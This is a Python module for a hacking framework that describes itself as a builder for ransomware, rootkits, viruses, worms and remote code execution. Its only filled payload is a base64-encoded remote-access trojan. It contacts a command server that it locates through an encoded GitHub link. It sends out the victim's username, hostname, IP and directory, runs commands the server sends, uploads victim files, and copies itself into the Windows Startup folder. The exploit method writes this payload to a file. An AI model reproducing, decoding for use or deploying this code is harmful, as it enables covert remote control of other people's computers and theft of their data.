#PLATFORM "[Unix,Linux,Windows,Mac,Dos]" #KOFEIT#
#PACKAGE "CMK" #KOFEIT#
#TYPE "[Hacking,APT,Cracking]" #KOFEIT#
#VERSION "0.2" #KOFEIT#
#LANGUAGE "Python" #KOFEIT#
#AUTHOR "Sinoce" #KOFEIT#
#TYPE_RUN "Remote"  #KOFEIT#
#USY 5 #KOFEIT#
from Kofeit import * 

class KOFEIT():

    def __init__(self) -> None:
        self.module_info = {
            "module_type":{
                "APT":True,
                "Hacking":True,
                "Pentest":True,
                "Cracking":True,
                "SessionHijacking":False,
            },
            "platform_target":"""
    Windows":"Supported
    Linux:Supported
    Dos:Supported
    Mac:Supported
                """,
            "module_language":"#LANGUAGE#",
            "ctime":"#DATE# #TIME#",
            "version":0.2
        }
        self.module_name = "CMK #KOFEIT#"
        self.option_types = {
            "Output":"<class 'str'>",
            "Type":"<class 'str'>",
            "Risk":"<class 'str'>",
        }
        self.options = {
            "Output":"Kofeit.py",
            "Type":"Rans",
            "Risk":"2",
        }
        self.rq = {}
        self.author = "Sinoce-HSC"
        self.description = "Tools For Create Ransomware,RootKit,Remote Code Execution,Virus,Worm"
        self.source_code = {
            "rce":{
                "1":b'ZnJvbSByZXF1ZXN0cyBpbXBvcnQgcG9zdCxnZXQsZXhjZXB0aW9ucw0KZnJvbSBiYXNlNjQgaW1wb3J0IGI2NGVuY29kZSBhcyBlbmMNCmZyb20gZGF0ZXRpbWUgaW1wb3J0IGRhdGV0aW1lDQpmcm9tIGJhc2U2NCBpbXBvcnQgYjY0ZGVjb2RlIGFzIGRjDQpmcm9tIHRocmVhZGluZyBpbXBvcnQgVGhyZWFkIGFzIHRodW5hcg0KZnJvbSBzdWJwcm9jZXNzIGltcG9ydCBnZXRvdXRwdXQgYXMgZW5nb3oNCmZyb20gdGltZSBpbXBvcnQgc2xlZXAgYXMgc3VuDQpmcm9tIHJlIGltcG9ydCBmaW5kYWxsIGFzIGZ1bg0KaW1wb3J0IHNodXRpbCxvcyxzb2NrZXQNCmltcG9ydCBvcw0KDQpkZWYgaXJhbm5vemRhaCgpOg0KICAgIHRyeToNCiAgICAgICAgcmV0dXJuIGZ1bihyIlVSTDooaHR0cHM6Ly8uKlwucHl0aG9uYW55d2hlcmVcLmNvbSkiLCBnZXQoZGMoYidhSFIwY0hNNkx5OW5hWFJvZFdJdVkyOXRMMU5wYm05alpUWTRMMmx1Wm05ZmMybHViMk5sTDJKc2IySXZiV0ZwYmk5emFYUmxMblI0ZEE9PScpLmRlY29kZSgpKS50ZXh0LnN0cmlwKCkpWzBdDQogICAgZXhjZXB0Og0KICAgICAgICByYWlzZSBDb25uZWN0aW9uRXJyb3IoIkVycm9yIikNCg0KDQoNCmRlZiB3ZWJicm93c2VyKCk6DQogICAgSUQgPSAiPFRBUkdFVF9VSUQ+Ig0KICAgIHByaW50KG9zLmdldHBpZCgpKQ0KICAgIHByaW50KCJ0ZXN0IGltcG9ydCAuLi4iKQ0KICAgIHdoaWxlIDE6DQogICAgICAgIHRyeToNCiAgICAgICAgICAgIHF1aSA9IGlyYW5ub3pkYWgoKQ0KICAgICAgICAgICAgcHJpbnQocXVpKQ0KICAgICAgICAgICAgaWYgIndoZXJlIiBpbiBxdWk6YnJlYWsNCiAgICAgICAgZXhjZXB0Oi4uLg0KICAgIHByaW50KCJPSyIpDQogICAgbW9udGgsa29uYW1pLGRhdGUgPSBvcy5nZXRsb2dpbigpLHNvY2tldC5nZXRob3N0bmFtZSgpLE5vbmUNCiAgICBkZWYgd2Vyd2VyKGUscik6cG9zdChxdWkgKyBkYyhiJ0wzTmxibVJmZEdGeVoyVjBYMjE1JykuZGVjb2RlKCksZGF0YT17J2lkJzpzdHIoSUQpLCAnY21kJzplLCAncmVzdWx0JzpyfSkNCiAgICBkZWYgYW50aShrZXksZnVuYyk6cmVzdWx0ID0gZW5nb3ooa2V5KTt0aHVuYXIodGFyZ2V0PWZ1bmMsYXJncz1ba2V5LHJlc3VsdF0pLnN0YXJ0KCkNCiAgICBkZWYgY2hlY2tfbmV0KGZpbGVuYW1lKToNCiAgICAgICAgaWYgb3MucGF0aC5pc2ZpbGUoZmlsZW5hbWUpOnJldHVybiAoVHJ1ZSBpZiBwb3N0KHF1aSArIGRjKGInTDNObGJtUmZabWxzWlY5MFlYSm5aWFJmYlhrPScpLmRlY29kZSgpLCBmaWxlcz17J2ZpbGUnOiBvcGVuKGZpbGVuYW1lLCdyYicpfSwgZGF0YT17J2lkJzpJRH0pLnN0YXR1c19jb2RlID09IDIwMCBlbHNlIEZhbHNlKQ0KICAgIGRlZiBlc2V0X2FudGkodSx3LHIsdCk6cmV0dXJuIChUcnVlIGlmIHBvc3QocXVpICsgZGMoYidMMmx1Wm05ZmJYbGZkR0Z5WjJWMCcpLmRlY29kZSgpLCBkYXRhPXsiaWQiOklELCJ1c2VyIjp1LCJ3aG9hbWkiOncsInJvb3QiOnIsJ3RpbWUnOnR9KS5zdGF0dXNfY29kZSA9PSAyMDAgZWxzZSBGYWxzZSkNCiAgICBkZWYgcmVjdigpOnJldHVybiBwb3N0KHF1aSArIGRjKGInTDNKbFkzWmZkR0Z5WjJWMFgyMTUnKS5kZWNvZGUoKSwgZGF0YT17ImlkIjpzdHIoSUQpfSkNCiAgICBkZWYgc3N0b29sa2l0KGFwcDpzdHIpOg0KICAgICAgICBzcmMgPSBvcy5nZXRjd2QoKSArICJcXCIgKyBhcHA7ZHN0ID0gZiJDOlxcVXNlcnNcXHtvcy5nZXRsb2dpbigpfVxcQXBwRGF0YVxcUm9hbWluZ1xcTWljcm9zb2Z0XFxXaW5kb3dzXFxTdGFydCBNZW51XFxQcm9ncmFtc1xcU3RhcnR1cFxce2FwcH0iDQogICAgICAgIGlmIHNodXRpbC5jb3B5ZmlsZShzcmMsZHN0KTpyZXR1cm4gVHJ1ZQ0KICAgICAgICBlbHNlOnJldHVybiBGYWxzZQ0KICAgIGRlZiB1Ymlzb2Z0KCk6cmV0dXJuIGdldCgiaHR0cHM6Ly9hcGkuaXBpZnkub3JnLyIpLnRleHQuc3RyaXAoKQ0KICAgIHQgPSBkYXRldGltZS5ub3coKTtkYXRlID0gZiJ7dC5ob3VyfTp7dC5taW51dGV9Ont0LnNlY29uZH0ge3QueWVhcn0ve3QubW9udGh9L3t0LmRheX0iDQogICAgDQogICAgd2hpbGUgMToNCiAgICAgICAgd2hpbGUgVHJ1ZToNCiAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICBrb24gPSB1Ymlzb2Z0KCk7cmVzcG9uc2UgPSBlc2V0X2FudGkodT1tb250aCx3PWYie2tvbmFtaX09PXtrb259IixyPW9zLmdldGN3ZCgpLHQ9ZW5jKGRhdGUuZW5jb2RlKCkpLmRlY29kZSgpKTtwcmludCgnbicpDQogICAgICAgICAgICAgICAgaWYgcmVzcG9uc2U6YnJlYWsNCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZTpwcmludChlKQ0KICAgICAgICB0cnk6DQogICAgICAgICAgICBkYXRhID0gcmVjdigpDQogICAgICAgICAgICBwcmludChkYXRhKQ0KICAgICAgICAgICAgaWYgZGF0YSBhbmQgZGF0YS50ZXh0ICE9ICJpZCBpbnZhbGlkIjoNCiAgICAgICAgICAgICAgICBpZiBkYXRhLnN0YXR1c19jb2RlID09IDIwMDoNCiAgICAgICAgICAgICAgICAgICAgaWYgJ2NtZCcgaW4gZGF0YS5qc29uKCk6DQogICAgICAgICAgICAgICAgICAgICAgICBkYXRhID0gZGF0YS5qc29uKCkNCiAgICAgICAgICAgICAgICAgICAgICAgIG9kID0gZGF0YVsnY21kJ10NCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGRhdGEpDQogICAgICAgICAgICAgICAgICAgICAgICBpZiBvZC5zdGFydHN3aXRoKCJjZCAiKToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkaXJlY3RvcnkgPSBvZC5yZXBsYWNlKCJjZCAiLCIiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG9zLnBhdGguaXNkaXIoZGlyZWN0b3J5KTpvcy5jaGRpcihkaXJlY3RvcnkpO3Jlc3VsdCA9IEYiRGlyOntkaXJlY3Rvcnl9Ijt0aHVuYXIodGFyZ2V0PXdlcndlcixhcmdzPVtvZCxyZXN1bHRdKS5zdGFydCgpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZTpyZXN1bHQgPSBGIkRpcjpOb25lIjt0aHVuYXIodGFyZ2V0PXdlcndlcixhcmdzPVtvZCxyZXN1bHRdKS5zdGFydCgpDQogICAgICAgICAgICAgICAgICAgICAgICBlbGlmIG9kLnN0YXJ0c3dpdGgoInJ1biAiKTphcHBfbmFtZSA9IG9kLnJlcGxhY2UoInJ1biAiLCAiIik7dGh1bmFyKHRhcmdldD1vcy5zdGFydGZpbGUsIGFyZ3M9W2FwcF9uYW1lXSkuc3RhcnQoKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZWxpZiBvZC5zdGFydHN3aXRoKCJkd24gIik6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZnAgPSBvZC5yZXBsYWNlKCJkd24gIiwiIikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBvcy5wYXRoLmlzZmlsZShmcCk6dGh1bmFyKHRhcmdldD13ZXJ3ZXIsYXJncz1bb2QsIlsqXSBTdGFydGVkIl0pLnN0YXJ0KCk7dGh1bmFyKHRhcmdldD1jaGVja19uZXQsIGFyZ3M9W2ZwXSkuc3RhcnQoKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6dGh1bmFyKHRhcmdldD13ZXJ3ZXIsIGFyZ3M9W29kLEYne2ZwfSBub3QgZm91bmQnXSkuc3RhcnQoKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZWxpZiBvZC5zdGFydHN3aXRoKCJib3JkICIpOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNob3J0Y3V0ID0gb2QucmVwbGFjZSgiYm9yZCAiLCJBREJcXGFkYiAiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRodW5hcih0YXJnZXQ9YW50aSxhcmdzPVtzaG9ydGN1dCx3ZXJ3ZXJdKS5zdGFydCgpDQogICAgICAgICAgICAgICAgICAgICAgICBlbGlmIG9kLnN0YXJ0c3dpdGgoJ3BydiAnKToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBhcHBfbmFtZSA9IG9kLnJlcGxhY2UoJ3BydiAnLCAiIik7cncgPSBzc3Rvb2xraXQoYXBwX25hbWUpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgcnc6dGh1bmFyKHRhcmdldD13ZXJ3ZXIsIGFyZ3M9W29kLCJbK10gb2siXSkuc3RhcnQoKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6dGh1bmFyKHRhcmdldD13ZXJ3ZXIsIGFyZ3M9W29kLCJbLV0gbm90Il0pLnN0YXJ0KCkNCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6dGh1bmFyKHRhcmdldD1hbnRpLGFyZ3M9W29kLHdlcndlcl0pLnN0YXJ0KCkNCiAgICAgICAgICAgICAgICAgICAgZWxpZiAnZmlsZScgaW4gZGF0YS5qc29uKCk6DQogICAgICAgICAgICAgICAgICAgICAgICBmaWxlID0gZGF0YS5qc29uKClbJ2ZpbGUnXTt0aHVuYXIodGFyZ2V0PXdlcndlcixhcmdzPVtvZCwiU3RhcnRlZCBVcGxkIl0pLnN0YXJ0KCkNCiAgICAgICAgICAgICAgICAgICAgICAgIHdpdGggb3BlbihmaWxlWyduYW1lJ10sICd3YicpIGFzIGZwOmZwLndyaXRlKGRjKGZpbGVbJ2RhdGEnXS5lbmNvZGUoKSkpDQogICAgICAgICAgICAgICAgICAgICAgICBpZiBvcy5wYXRoLmlzZmlsZShmaWxlWyduYW1lJ10pOnRodW5hcih0YXJnZXQ9d2Vyd2VyLGFyZ3M9W2ZpbGVbJ25hbWUnXSwiU3VjY2Vzc2Z1bGx5Il0pLnN0YXJ0KCkNCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6dGh1bmFyKHRhcmdldD13ZXJ3ZXIsYXJncz1bZmlsZVsnbmFtZSddLCJmYWlsZWQiXSkuc3RhcnQoKQ0KICAgICAgICAgICAgICAgICAgICBzdW4oMS41KQ0KICAgICAgICAgICAgICAgIHN1bigzKQ0KICAgICAgICBleGNlcHQgZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6Li4uDQogICAgICAgIGV4Y2VwdCBPU0Vycm9yOi4uLg0KDQpkZWYgZXhpdF9vbmUoKToNCiAgICB3ZWJicm93c2VyKCkNCg0KaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoNCiAgICBleGl0X29uZSgpDQo=',
                "2":"",
                "3":""
            },
            "worm":{
                "1":"",
                "2":"",
                "3":""
            },
            "virus":{
                "1":"",
                "2":"",
                "3":""
            },
            "rans":{
                "1":"",
                "2":"",
                "3":""
            },
            "rkit":{
                "1":"",
                "2":"",
                "3":""
            }
        }
    def info(self):
        language = self.module_info["module-language"]
        platform = self.module_info["platform_target"]
        ctime = self.module_info['ctime']
        version  = self.module_info['version']
        print_status("#6[#2*#6] #0" + f"Module-Name:{self.module_name}\nLanguage-Module:{language}\nPlatform-Supported:\n[\n{platform}\n]\nDescription:{self.description}\nAuthor:{self.author_module}\nTime-Created:{ctime}\nVersion:{version}", True)
    def check_variable(self,var):
        if var:return True
        else:return False
    def show_options(self):
        print_status(f"""
Key		             Value
======================================
Output    :           {self.options['Output']}
Type      :           {self.options['Type']}
Risk      :           {self.options['Risk']}""",True)
    def set_value(self,key,value):
        if key in self.options:
            if self.option_types[key] == "<class 'list'>"  and str(type(value)) == "<class 'str'>":
                value = value.split(",")
                self.options[key] = value
                value_str = '[ ' + " | ".join(value) + ' ]'
                print_status("#6[#2*#6] #0" + f"#1{key} #3=#2>#66 {value_str}#0",True)
            elif self.option_types[key] == "<class 'str'>" and str(type(value)) == "<class 'str'>":
                self.options[key] = value
                print_status("#6[#2*#6] #0" + f"#1{key} #3=#2>#66 {value}#0",True)
            else:
                print_no(f"#4Type#2 {key}#3 Is #1{self.option_types[key]} #2can't #22set #5 > #22{str(type(value))}#0",True)
        else:
            print_no(f"#1{key}#22 Invalid #66(#1{key}#66) #4Not#3 Found #2!#0",True)
    def help(self):
        print_status(f"""
#2info #3ARGS#5[#22None#5] #6(#55Show info Module #11{self.module_name.split(" ")[0]}#6)
#2set #3/ #2set_value #3ARGS#5[#2<#1KEY#2> #2<#1VALUE#2>#5] #6(#55Set A Key To Value#6)
#2show options #3/ #2show_options #3ARGS#5[#22None#5] #6(#55Show the options Module #11{self.module_name.split(" ")[0]}#6)
#2check #3ARGS#5[#22None#5] #6(#55Check Options Seted and Module #11{self.module_name.split(" ")[0]}#6)
#2exploit #3/ #2run #3ARGS#5[#22None#5] #6(#55run the module #11{self.module_name.split(" ")[0]}#6)
#33Values:\n\tType:[rans / virus / rce / worm / rkit]\n\tRisk:[1 / 2 / 3]\n\tOutput:[Filename Save]""",True)
    def check(self):
        if self.options['Type'] == 'rce':
            risk = self.options['Risk']
            if risk == 1 or risk == "1":
                print_status("""#111#4-#6Bypass AnitMalwares \n#112#4-#6Download From Victim \n#113#4-#6Upload To Victim\n#114#4-#6Inject Command To Victim\n#115#4-#6Low Size & Copy Startup""",True)
            elif risk == 2 or risk == "2":
                ...
            elif risk == 3 or risk == "3":
                ...
            else:
                print_status(f"#0(#4{risk}#0) #2Is Invalid ' #22R#11ange#4(#61#0,#62#0,#63#0#4)",True)
        elif self.options['Type'] == 'rans':
            risk = self.options['Risk']
            if risk == 1:
                ...
            elif risk == 2:
                ...
            elif risk == 3:
                ...
            else:
                print_status(f"#0(#4{risk}#0) #2Is Invalid ' #22R#11ange#4(#61#0,#62#0,#63#0#4)",True)
        elif self.options['Type'] == 'virus':
            risk = self.options['Risk']
            if risk == 1:
                ...
            elif risk == 2:
                ...
            elif risk == 3:
                ...
            else:
                print_status(f"#0(#4{risk}#0) #2Is Invalid ' #22R#11ange#4(#61#0,#62#0,#63#0#4)",True)
        elif self.options['Type'] == 'worm':
            risk = self.options['Risk']
            if risk == 1:
                ...
            elif risk == 2:
                ...
            elif risk == 3:
                ...
            else:
                print_status(f"#0(#4{risk}#0) #2Is Invalid ' #22R#11ange#4(#61#0,#62#0,#63#0#4)",True)
        elif self.options['Type'] == 'rkit':
            risk = self.options['Risk']
            if risk == 1:
                ...
            elif risk == 2:
                ...
            elif risk == 3:
                ...
            else:
                print_status(f"#0(#4{risk}#0) #2Is Invalid ' #22R#11ange#4(#61#0,#62#0,#63#0#4)",True)
    def exploit(self):
        source = self.source_code[self.options['Type']][self.options['Risk']]
        if source:
            open(self.options['Output'], 'wb').write(base64.b64decode(source))
            print_ok(f"Rce Created {self.options['Output']}",True)